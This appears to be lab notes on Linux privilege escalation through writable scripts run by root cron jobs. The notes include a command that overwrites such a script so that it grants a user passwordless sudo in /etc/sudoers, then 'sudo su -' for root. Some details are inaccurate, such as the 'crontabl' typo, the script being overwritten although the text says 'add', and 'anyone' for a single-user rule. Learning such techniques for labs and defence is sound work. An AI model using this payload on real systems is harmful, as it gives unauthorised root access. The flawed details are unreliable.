# Privilege Escalation: Misconfigured Cron Jobs

## Contents
- [Intro](#intro)
  - [Cron Jobs](#cron-jobs)
  - [Exploiting Misconfigured Cron Jobs](#exploiting-misconfigured-cron-jobs)
- [Practical :: Process](#practical--process)
  - [Scenario](#scenario)
  - [Objective](#objective)
  - [List the cron jobs](#list-the-cron-jobs)
  - [Find a Misconfiguration](#find-a-misconfiguration)
  - [Modify & Exploit](#modify--exploit)

## Intro

### Cron Jobs
- Linux implements task scheduling through a utility called cron.
- `cron` is a time-based service that runs applications, scripts, and other commands repeatedly on a specified schedule.
- An application or script that has been configured to be run repeatedly with cron is known as a cron job.
  - `cron` can be used to automate or repeat a wide variety of functions on a system (from daily backups to system upgrades and patches).
- The `crontab` file is a configuration file that is used by the `cron` utility to store and track cron jobs that have been created.

### Exploiting Misconfigured Cron Jobs
- cron jobs can also be run as any user on the system.
  - This is very important.
  - We will be targeting cron jobs that have been configured to be run as root.
- This is primarily because any script or command that is run by a cron job will run as root user and will consequently provide us with root access.
  - Find a shell script listed in crontab
  - Check that script's perms. If it is misconfigured and allows you to write to that file, you can modify it and put some exploit code in it.
- In order to elevate our privileges we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

## Practical :: Process
> This was part of a lab, but it should be sufficient to replicate the concept in other contexts.

### Scenario
- You are already provided with access to the target system...
- You have access through an unpriviledged "student" account.
- Enum a bit: `whoami`, `groups student` (not much participation), `cat /etc/passwd`

### Objective
- We want root or sudo (either one will give us root privs and access)

### List the cron jobs
```
crontabl -l   # lists the cron jobs for the current user
```

### Find a Misconfiguration
- If a cron job has been set by root but it runs a file in a user's home directory, you may be able to find the script that root set up to run that file.
- If you can find the script, and if that script has perms allowing you to write, you can modify it and add malicious code.
- That code will run when the cron job runs.
- Example: A file named "message" sits in the student's home directory. Use `grep` to find calls to that file:
```
cd /
grep -rnw /usr -e "/home/student/message"
```
- `-r` : recursive; read all files under each directory in the path specified
- `-n` : number; preface each result with the line number of the file it's in
- `-w` : word; Select only those lines containing matches that form whole words
- `-e` : expression; search for the pattern provided (regEx)

### Modify & Exploit
- Assuming our grep search found `/usr/local/share/copy.sh' calls that message file.
- If that file is misconfigured to allow you to write, add this to it:
```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh
```
- That adds a rule to `/etc/sudoers` to allow anyone to execute anything as root, and then it sends that line to the script that cron will run.
- When cron runs that script, you get privileges to run anything you want:
```
sudo su -  # that'll get you root
```
